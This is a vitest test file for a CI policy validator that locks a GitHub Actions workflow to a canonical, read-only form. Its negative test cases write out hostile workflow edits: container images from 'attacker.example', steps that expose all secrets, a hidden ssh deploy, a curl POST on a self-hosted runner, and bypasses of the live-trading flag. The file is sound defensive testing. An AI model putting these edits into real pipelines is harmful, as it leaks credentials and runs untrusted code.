import { describe, expect, it } from 'vitest';
import * as policyModule from '../scripts/ci-repository-policy.mjs';

const {
  parseWorkflowYaml,
  validatePackageScripts,
  validateTrackedRepositoryPaths,
  validateWorkflowConfiguration,
} = policyModule as typeof policyModule & {
  validatePackageScripts: (scripts: Record<string, string>) => string[];
  validateTrackedRepositoryPaths: (paths: string[]) => string[];
};
const workflowFileSetErrors = (paths: string[]) => {
  const validator = (policyModule as unknown as {
    validateTrackedWorkflowPaths?: (trackedPaths: string[]) => string[];
  }).validateTrackedWorkflowPaths;
  expect(validator).toBeTypeOf('function');
  return validator?.(paths).join('\n') ?? 'tracked workflow validator missing';
};

const SAFE_WORKFLOW = `name: CI

on:
  push:
    branches:
      - main
  pull_request:
    branches:
      - main
  workflow_call: {}
  workflow_dispatch: {}

permissions:
  contents: read

concurrency:
  group: ci-\${{ github.workflow }}-\${{ github.ref }}
  cancel-in-progress: true

env:
  CI: 'true'
  MODE: paper
  TRITON_LIVE_ENABLED: 'false'
  ENTRY_SHADOW_MODE: 'true'

jobs:
  quality:
    name: tests-build-zero-cost
    runs-on: ubuntu-24.04
    timeout-minutes: 35
    steps:
      - name: Check out repository
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
        with:
          fetch-depth: 0
          persist-credentials: false
      - name: Set up Node.js
        uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020
        with:
          node-version: '22.23.2'
          cache: npm
          cache-dependency-path: package-lock.json
      - name: Install pinned Rust toolchain
        run: rustup toolchain install 1.97.1 --profile minimal --component clippy,rustfmt
      - name: Validate Pump protocol dependencies before fetch
        run: node scripts/assert-pump-protocol-v2-offline.mjs --static
      - name: Validate OF1 planner dependencies before fetch
        run: node scripts/assert-of1-planner-offline.mjs --static
      - name: Validate Bronze decoder dependencies before fetch
        run: node scripts/assert-of1-bronze-offline.mjs --static
      - name: Restore scoped Rust build cache
        uses: actions/cache@55cc8345863c7cc4c66a329aec7e433d2d1c52a9
        with:
          path: "~/.cargo/registry/index\\n~/.cargo/registry/cache\\n~/.cargo/registry/src\\nrust/of1-range-recorder/target\\nrust/pump-protocol-v2/target\\nrust/old-faithful-pump-reducer/target"
          key: rust-v1-\${{ runner.os }}-\${{ runner.arch }}-1.97.1-\${{ hashFiles('rust/**/Cargo.lock', 'rust/**/Cargo.toml') }}-\${{ github.sha }}
          restore-keys: rust-v1-\${{ runner.os }}-\${{ runner.arch }}-1.97.1-\${{ hashFiles('rust/**/Cargo.lock', 'rust/**/Cargo.toml') }}-
      - name: Fetch locked Pump protocol dependencies
        run: cargo +1.97.1 fetch --manifest-path rust/pump-protocol-v2/Cargo.toml --locked
      - name: Fetch locked OF1 planner dependencies
        run: cargo +1.97.1 fetch --manifest-path rust/of1-range-recorder/Cargo.toml --locked
      - name: Fetch locked Bronze decoder dependencies
        run: cargo +1.97.1 fetch --manifest-path rust/of1-bronze-decoder/Cargo.toml --locked
      - name: Install locked dependencies
        run: npm ci
      - name: Enforce repository and zero-cost policy
        run: npm run ci:policy
      - name: Enforce offline research citation gate
        run: npm run ci:research-citations
      - name: Run policy bypass and critical zero-cost/Pump tests
        run: npx --no-install vitest run tests/ci-policy.test.ts tests/ci-research-citations.test.ts tests/pump-protocol-v2-policy.test.ts tests/pump-silver-event.test.ts tests/zero-cost.test.ts tests/pump-replay.test.ts tests/pump-vertical-slice.test.ts tests/lifecycle-tp-sl.test.ts
      - name: Run complete test suite
        run: npm test
      - name: Type-check
        run: npx --no-install tsc --noEmit
      - name: Build backend and frontend
        run: npm run build
      - name: Check Rust reducer formatting
        run: cargo +1.97.1 fmt --manifest-path rust/old-faithful-pump-reducer/Cargo.toml --all -- --check
      - name: Check Linux namespace-lock formatting
        run: cargo +1.97.1 fmt --manifest-path rust/linux-kernel-namespace-lock/Cargo.toml -- --check
      - name: Check Jetstreamer callback snapshot formatting
        run: cargo +1.97.1 fmt --manifest-path rust/jetstreamer-v0-7-callback-types/Cargo.toml -- --check
      - name: Check Solana runtime snapshot formatting
        run: cargo +1.97.1 fmt --manifest-path rust/solana-runtime-v3.1.12-bank-types/Cargo.toml -- --check
      - name: Check Pump protocol v2 formatting
        run: cargo +1.97.1 fmt --manifest-path rust/pump-protocol-v2/Cargo.toml --all -- --check
      - name: Verify Pump protocol v2 isolated graph, clippy, tests and evidence
        run: node scripts/assert-pump-protocol-v2-offline.mjs --all
      - name: Verify OF1 planner isolated graph, formatting, tests and evidence
        run: node scripts/assert-of1-planner-offline.mjs --all
      - name: Verify Bronze decoder isolated graph, formatting, tests and evidence
        run: node scripts/assert-of1-bronze-offline.mjs --all
      - name: Lint Rust reducer
        run: cargo +1.97.1 clippy --manifest-path rust/old-faithful-pump-reducer/Cargo.toml --locked --all-targets -- -D warnings
      - name: Test Rust reducer
        run: cargo +1.97.1 test --manifest-path rust/old-faithful-pump-reducer/Cargo.toml --locked --all-targets
      - name: Build Rust reducer
        run: cargo +1.97.1 build --manifest-path rust/old-faithful-pump-reducer/Cargo.toml --locked
      - name: Check committed pull-request patch integrity
        if: github.event_name == 'pull_request'
        run: git diff --check "\${{ github.event.pull_request.base.sha }}...\${{ github.event.pull_request.head.sha }}"
      - name: Check committed push integrity
        if: github.event_name != 'pull_request'
        run: git show --check --format= HEAD
      - name: Verify tracked files were not modified by checks
        run: test -z "$(git status --porcelain --untracked-files=no)"
`;

const errors = (workflow: string) => validateWorkflowConfiguration(workflow).join('\n');
const addStep = (body: string) => SAFE_WORKFLOW.replace(
  '      - name: Verify tracked files were not modified by checks',
  `${body}\n      - name: Verify tracked files were not modified by checks`,
);

describe('semantic CI workflow policy', () => {
  it('accepts the canonical read-only zero-cost workflow', () => {
    expect(validateWorkflowConfiguration(SAFE_WORKFLOW)).toEqual([]);
    expect(parseWorkflowYaml(SAFE_WORKFLOW).jobs.quality.steps).toHaveLength(31);
  });

  it('runs PR validation and main validation without duplicate feature-branch pushes', () => {
    const triggers = parseWorkflowYaml(SAFE_WORKFLOW).on;
    expect(triggers.push.branches).toEqual(['main']);
    expect(triggers.pull_request.branches).toEqual(['main']);
    expect(triggers.workflow_dispatch).toEqual({});
    expect(triggers.workflow_call).toEqual({});
    for (const branch of ['v2/**', 'cursor/**', 'feature/**', '**']) {
      expect(errors(SAFE_WORKFLOW.replace('      - main', `      - main\n      - '${branch}'`)))
        .toMatch(/trigger|canonical workflow/i);
    }
  });

  it('caches only registry inputs and three ignored Rust target directories', () => {
    const steps = parseWorkflowYaml(SAFE_WORKFLOW).jobs.quality.steps;
    const cache = steps.find((step: { name: string }) => step.name === 'Restore scoped Rust build cache');
    expect(cache.uses).toBe('actions/cache@55cc8345863c7cc4c66a329aec7e433d2d1c52a9');
    expect(cache.with.path.split('\n')).toEqual([
      '~/.cargo/registry/index', '~/.cargo/registry/cache', '~/.cargo/registry/src',
      'rust/of1-range-recorder/target', 'rust/pump-protocol-v2/target',
      'rust/old-faithful-pump-reducer/target',
    ]);
    expect(cache.with.key).toContain("1.97.1-${{ hashFiles('rust/**/Cargo.lock', 'rust/**/Cargo.toml') }}-${{ github.sha }}");
    expect(cache.with['restore-keys']).toBe(cache.with.key.replace('${{ github.sha }}', ''));
    const position = (name: string) => steps.findIndex((step: { name: string }) => step.name === name);
    expect(position('Validate Pump protocol dependencies before fetch')).toBeLessThan(position(cache.name));
    expect(position('Validate OF1 planner dependencies before fetch')).toBeLessThan(position(cache.name));
    expect(position(cache.name)).toBeLessThan(position('Fetch locked Pump protocol dependencies'));
    expect(position(cache.name)).toBeLessThan(position('Fetch locked OF1 planner dependencies'));
  });

  it('rejects broad cache paths, cross-toolchain keys, unpinned actions and hit-based gate skips', () => {
    for (const variant of [
      SAFE_WORKFLOW.replace('~/.cargo/registry/src', '~/.cargo'),
      SAFE_WORKFLOW.replace('rust/of1-range-recorder/target', '/home/runner'),
      SAFE_WORKFLOW.replace('rust/pump-protocol-v2/target', '/tmp'),
      SAFE_WORKFLOW.replace('rust/old-faithful-pump-reducer/target', 'data'),
      SAFE_WORKFLOW.replace('actions/cache@55cc8345863c7cc4c66a329aec7e433d2d1c52a9', 'actions/cache@v6'),
      SAFE_WORKFLOW.replace('1.97.1-${{ hashFiles', 'stable-${{ hashFiles'),
      SAFE_WORKFLOW.replace(/          restore-keys: .+/, '          restore-keys: rust-'),
      SAFE_WORKFLOW.replace('      - name: Run complete test suite',
        "      - name: Run complete test suite\n        if: steps.cache.outputs.cache-hit != 'true'"),
      SAFE_WORKFLOW.replace('      - name: Verify OF1 planner isolated graph, formatting, tests and evidence',
        "      - name: Verify OF1 planner isolated graph, formatting, tests and evidence\n        if: steps.cache.outputs.cache-hit != 'true'"),
    ]) {
      expect(errors(variant)).toMatch(/canonical workflow|unapproved action|action input|canonical step/i);
    }
  });

  it('requires the real citation step and rejects comments, renaming, or formatting drift as substitutes', () => {
    const removed = SAFE_WORKFLOW
      .split('\n')
      .filter((line) => !line.includes('Enforce offline research citation gate') && !line.includes('npm run ci:research-citations'))
      .join('\n');
    const commentOnly = SAFE_WORKFLOW.replace(
      '      - name: Enforce offline research citation gate\n        run: npm run ci:research-citations',
      '      # - name: Enforce offline research citation gate\n      #   run: npm run ci:research-citations',
    );
    const renamed = SAFE_WORKFLOW.replace('Enforce offline research citation gate', 'Citation notes');
    const commandDrift = SAFE_WORKFLOW.replace(
      '        run: npm run ci:research-citations',
      '        run: npm run ci:research-citations# formatting-bypass',
    );
    for (const [label, unsafe] of [
      ['removed', removed],
      ['commentOnly', commentOnly],
      ['renamed', renamed],
      ['commandDrift', commandDrift],
    ] as const) {
      expect(errors(unsafe), label).toMatch(/canonical steps|canonical workflow|unapproved run command/i);
    }
  });

  it('requires every exact pinned Rust gate and rejects silent removal or replacement', () => {
    const requiredRustCommands = [
      ['Install pinned Rust toolchain', 'rustup toolchain install 1.97.1 --profile minimal --component clippy,rustfmt'],
      ['Validate Pump protocol dependencies before fetch', 'node scripts/assert-pump-protocol-v2-offline.mjs --static'],
      ['Fetch locked Pump protocol dependencies', 'cargo +1.97.1 fetch --manifest-path rust/pump-protocol-v2/Cargo.toml --locked'],
      ['Validate OF1 planner dependencies before fetch', 'node scripts/assert-of1-planner-offline.mjs --static'],
      ['Validate Bronze decoder dependencies before fetch', 'node scripts/assert-of1-bronze-offline.mjs --static'],
      ['Fetch locked Bronze decoder dependencies', 'cargo +1.97.1 fetch --manifest-path rust/of1-bronze-decoder/Cargo.toml --locked'],
      ['Verify Bronze decoder isolated graph, formatting, tests and evidence', 'node scripts/assert-of1-bronze-offline.mjs --all'],
      ['Fetch locked OF1 planner dependencies', 'cargo +1.97.1 fetch --manifest-path rust/of1-range-recorder/Cargo.toml --locked'],
      ['Verify OF1 planner isolated graph, formatting, tests and evidence', 'node scripts/assert-of1-planner-offline.mjs --all'],
      ['Check Rust reducer formatting', 'cargo +1.97.1 fmt --manifest-path rust/old-faithful-pump-reducer/Cargo.toml --all -- --check'],
      ['Check Linux namespace-lock formatting', 'cargo +1.97.1 fmt --manifest-path rust/linux-kernel-namespace-lock/Cargo.toml -- --check'],
      ['Check Jetstreamer callback snapshot formatting', 'cargo +1.97.1 fmt --manifest-path rust/jetstreamer-v0-7-callback-types/Cargo.toml -- --check'],
      ['Check Solana runtime snapshot formatting', 'cargo +1.97.1 fmt --manifest-path rust/solana-runtime-v3.1.12-bank-types/Cargo.toml -- --check'],
      ['Check Pump protocol v2 formatting', 'cargo +1.97.1 fmt --manifest-path rust/pump-protocol-v2/Cargo.toml --all -- --check'],
      ['Verify Pump protocol v2 isolated graph, clippy, tests and evidence', 'node scripts/assert-pump-protocol-v2-offline.mjs --all'],
      ['Lint Rust reducer', 'cargo +1.97.1 clippy --manifest-path rust/old-faithful-pump-reducer/Cargo.toml --locked --all-targets -- -D warnings'],
      ['Test Rust reducer', 'cargo +1.97.1 test --manifest-path rust/old-faithful-pump-reducer/Cargo.toml --locked --all-targets'],
      ['Build Rust reducer', 'cargo +1.97.1 build --manifest-path rust/old-faithful-pump-reducer/Cargo.toml --locked'],
    ];
    for (const [name, command] of requiredRustCommands) {
      const removed = SAFE_WORKFLOW
        .split('\n')
        .filter((line) => !line.includes(command) && !line.includes(`name: ${name}`))
        .join('\n');
      expect(errors(removed)).toMatch(/canonical steps|canonical workflow/i);
      expect(errors(SAFE_WORKFLOW.replace(command, 'npm test'))).toMatch(/unapproved run command|canonical workflow/i);
    }
  });

  it('rejects Rust toolchain drift and weakening of the all-targets locked gates', () => {
    const variants = [
      SAFE_WORKFLOW.replace('toolchain install 1.97.1', 'toolchain install stable'),
      SAFE_WORKFLOW.replace('clippy --manifest-path', 'clippy --no-deps --manifest-path'),
      SAFE_WORKFLOW.replace('test --manifest-path', 'test --lib --manifest-path'),
      SAFE_WORKFLOW.replace('build --manifest-path', 'build --release --manifest-path'),
      SAFE_WORKFLOW.replace(' --locked --all-targets -- -D warnings', ' --all-targets'),
    ];
    for (const variant of variants) {
      expect(errors(variant)).toMatch(/unapproved run command|canonical workflow/i);
    }
  });

  it('rejects the original comment bypass and quoted/unquoted top-level live values', () => {
    const commentBypass = SAFE_WORKFLOW.replace(
      "  TRITON_LIVE_ENABLED: 'false'",
      "  # TRITON_LIVE_ENABLED: 'false'\n  TRITON_LIVE_ENABLED: 'true'",
    );
    expect(errors(commentBypass)).toMatch(/TRITON_LIVE_ENABLED.*false/i);
    for (const value of ['true', "'true'", '"true"']) {
      expect(errors(SAFE_WORKFLOW.replace("'false'", value))).toMatch(/TRITON_LIVE_ENABLED.*false/i);
    }
  });

  it('rejects duplicate block and inline mapping keys', () => {
    const duplicateBlock = SAFE_WORKFLOW.replace(
      "  TRITON_LIVE_ENABLED: 'false'",
      "  TRITON_LIVE_ENABLED: 'false'\n  TRITON_LIVE_ENABLED: false",
    );
    expect(errors(duplicateBlock)).toMatch(/duplicate mapping key/i);

    const duplicateInline = SAFE_WORKFLOW.replace(
      '  quality:',
      "  quality:\n    env: { TRITON_LIVE_ENABLED: false, 'TRITON_LIVE_ENABLED': true }",
    );
    expect(errors(duplicateInline)).toMatch(/duplicate mapping key/i);
  });

  it('rejects a job-level inline live override', () => {
    const unsafe = SAFE_WORKFLOW.replace(
      '  quality:',
      '  quality:\n    env: { TRITON_LIVE_ENABLED: true }',
    );
    expect(errors(unsafe)).toMatch(/safety environment key TRITON_LIVE_ENABLED/i);
  });

  it('rejects a step-level inline live override', () => {
    const unsafe = SAFE_WORKFLOW.replace(
      '      - name: Install locked dependencies',
      '      - name: Install locked dependencies\n        env: { TRITON_LIVE_ENABLED: true }',
    );
    expect(errors(unsafe)).toMatch(/safety environment key TRITON_LIVE_ENABLED/i);
  });

  it('normalizes quoted keys and rejects the same live override', () => {
    const unsafe = SAFE_WORKFLOW.replace(
      '  quality:',
      "  quality:\n    env:\n      'TRITON_LIVE_ENABLED': 'true'",
    );
    expect(errors(unsafe)).toMatch(/safety environment key TRITON_LIVE_ENABLED/i);
  });

  it('rejects job-level write-all permissions', () => {
    const unsafe = SAFE_WORKFLOW.replace(
      '  quality:',
      '  quality:\n    permissions: write-all',
    );
    expect(errors(unsafe)).toMatch(/permissions override/i);
  });

  it('rejects job-level inline permission maps even when top-level remains read-only', () => {
    const unsafe = SAFE_WORKFLOW.replace(
      '  quality:',
      '  quality:\n    permissions: { contents: read, id-token: write }',
    );
    expect(errors(unsafe)).toMatch(/permissions override/i);
  });

  it('checks every checkout and rejects a second checkout with default persistence', () => {
    const unsafe = SAFE_WORKFLOW.replace(
      '      - name: Install locked dependencies',
      '      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n      - name: Install locked dependencies',
    );
    expect(errors(unsafe)).toMatch(/every checkout step.*persist-credentials: false/i);
    expect(errors(unsafe)).toMatch(/exactly one actions\/checkout step/i);
  });

  it('rejects a second checkout even when both disable credential persistence', () => {
    const unsafe = SAFE_WORKFLOW.replace(
      '      - name: Install locked dependencies',
      '      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n        with: { persist-credentials: false }\n      - name: Install locked dependencies',
    );
    expect(errors(unsafe)).toMatch(/exactly one actions\/checkout step/i);
  });

  it('rejects safety overrides hidden in another nested map such as container.env', () => {
    const unsafe = SAFE_WORKFLOW.replace(
      '    runs-on: ubuntu-24.04',
      '    runs-on: ubuntu-24.04\n    container: { image: node:22, env: { TRITON_LIVE_ENABLED: true } }',
    );
    expect(errors(unsafe)).toMatch(/safety environment key TRITON_LIVE_ENABLED/i);
  });

  it('fails closed on unsupported YAML features instead of approximating them', () => {
    const unsafe = SAFE_WORKFLOW.replace('        run: npm test', '        run: |\n          npm test');
    expect(errors(unsafe)).toMatch(/block scalars are not supported/i);
  });

  it('preserves attached hash characters and rejects every block-scalar header variant', () => {
    const attachedHash = SAFE_WORKFLOW.replace(
      '        run: npm ci',
      '        run: echo harmless#; /usr/bin/ssh deploy@example.invalid',
    );
    expect(errors(attachedHash)).toMatch(/unapproved run command|deployment command/i);

    for (const header of ['|2', '>2', '|2-', '>+2']) {
      const blockScalar = SAFE_WORKFLOW.replace('        run: npm ci', `        run: ${header}`);
      expect(errors(blockScalar)).toMatch(/block scalars are not supported|canonical workflow/i);
    }
  });

  it('rejects index and whole-context secret expressions', () => {
    const indexedSecret = SAFE_WORKFLOW.replace(
      '          persist-credentials: false',
      "          persist-credentials: false\n          token: ${{ secrets['DEPLOY_TOKEN'] }}",
    );
    const wholeContext = addStep(
      '      - name: expose secrets\n        env:\n          ALL_SECRETS: ${{ toJSON(secrets) }}\n        run: npm test',
    );
    expect(errors(indexedSecret)).toMatch(/secret/i);
    expect(errors(wholeContext)).toMatch(/secret/i);
  });

  it('rejects github.env mutation and expression-based live unlocks', () => {
    const githubEnv = addStep(
      '      - name: mutate environment\n        run: echo "ENTRY_SHADOW_MODE=false" >> "${{ github.env }}"',
    );
    const liveExpression = addStep(
      "      - name: enable live\n        run: TRITON_LIVE_ENABLED=${{ 'true' }} node dist/main.js",
    );
    expect(errors(githubEnv)).toMatch(/environment|canonical workflow/i);
    expect(errors(liveExpression)).toMatch(/live Triton|canonical workflow/i);
  });

  it('rejects non-canonical jobs, runners, containers, and services', () => {
    const variants = [
      SAFE_WORKFLOW.replace('    runs-on: ubuntu-24.04', '    runs-on: self-hosted'),
      SAFE_WORKFLOW.replace(
        '    runs-on: ubuntu-24.04',
        '    runs-on: ubuntu-24.04\n    container: attacker.example/ci:latest',
      ),
      SAFE_WORKFLOW.replace(
        '    runs-on: ubuntu-24.04',
        '    runs-on: ubuntu-24.04\n    services:\n      control:\n        image: attacker.example/control:latest',
      ),
      `${SAFE_WORKFLOW}\n  mutate:\n    runs-on: self-hosted\n    steps:\n      - run: curl -X POST https://internal.invalid/mutate\n`,
    ];
    for (const variant of variants) {
      expect(errors(variant)).toMatch(/canonical|runner|container|services|exactly one job/i);
    }
  });

  it('rejects arbitrary run commands and action input drift', () => {
    const variants = [
      addStep('      - name: deploy\n        run: /usr/bin/ssh deploy@example.invalid'),
      addStep('      - name: deploy\n        run: docker buildx build --push .'),
      SAFE_WORKFLOW.replace("          node-version: '22.23.2'", "          node-version: '23'"),
    ];
    for (const variant of variants) {
      expect(errors(variant)).toMatch(/unapproved run command|canonical workflow|action input/i);
    }
  });

  it('rejects trigger drift and any workflow outside ordinary CI and Roadmap Sync', () => {
    const pullRequestTarget = SAFE_WORKFLOW.replace('  pull_request:', '  pull_request_target:');
    expect(errors(pullRequestTarget)).toMatch(/trigger|canonical workflow/i);
    const reviewed = [
      '.github/workflows/ci.yml',
      '.github/workflows/roadmap-sync.yml',
    ];
    expect(workflowFileSetErrors(reviewed)).toBe('');
    expect(workflowFileSetErrors([...reviewed, '.github/workflows/deploy.yml'])).toMatch(/workflow file set/i);
  });

  it('rejects every tracked Hermes path and a permanent root legacy archive', () => {
    expect(validateTrackedRepositoryPaths(['src/main.ts', 'docs/HANDOFF_V2.md'])).toEqual([]);
    expect(validateTrackedRepositoryPaths(['.hermes/plans/retired.md'])).toEqual([
      'retired Hermes path must not be tracked: .hermes/plans/retired.md',
    ]);
    expect(validateTrackedRepositoryPaths(['legacy/v1/runtime.ts'])).toEqual([
      'permanent root legacy directory must not be tracked: legacy/v1/runtime.ts',
    ]);
  });

  it('locks the B2A package command graph and rejects a legacy runtime launcher under any script name', () => {
    const safe = {
      'start:cockpit': 'node dist/cockpit-main.js',
      'start:acquisition-monitor': 'node dist/acquisition-monitor/main.js',
      'build:monitor': 'tsc -p frontend/tsconfig.monitor.json && vite build --config frontend/vite.monitor.config.ts',
      build: 'tsc -p tsconfig.json && npm run verify:research-transport && npm run verify:phase8a-runner-offline && npm run build:cockpit && npm run verify:cockpit-runtime && npm run build:monitor',
      'build:frontend': 'vite build --config frontend/vite.config.ts',
    };
    expect(validatePackageScripts(safe)).toEqual([]);

    for (const scripts of [
      { ...safe, dev: 'tsx src/main.ts' },
      { ...safe, start: 'node dist/main.js' },
      { ...safe, scanner: 'node ./dist/main.js --paper' },
      { ...safe, scanner: 'tsx ./src/main.ts' },
    ]) {
      expect(validatePackageScripts(scripts).join('\n')).toMatch(/frozen legacy/);
    }
    expect(validatePackageScripts({ ...safe, build: `${safe.build} && npm run build:frontend` }).join('\n')).toMatch(/offline command graph/);
    expect(validatePackageScripts({ ...safe, 'verify:phase8c-contracts': 'node retired.mjs' }).join('\n')).toMatch(/retired package script/);
  });
});
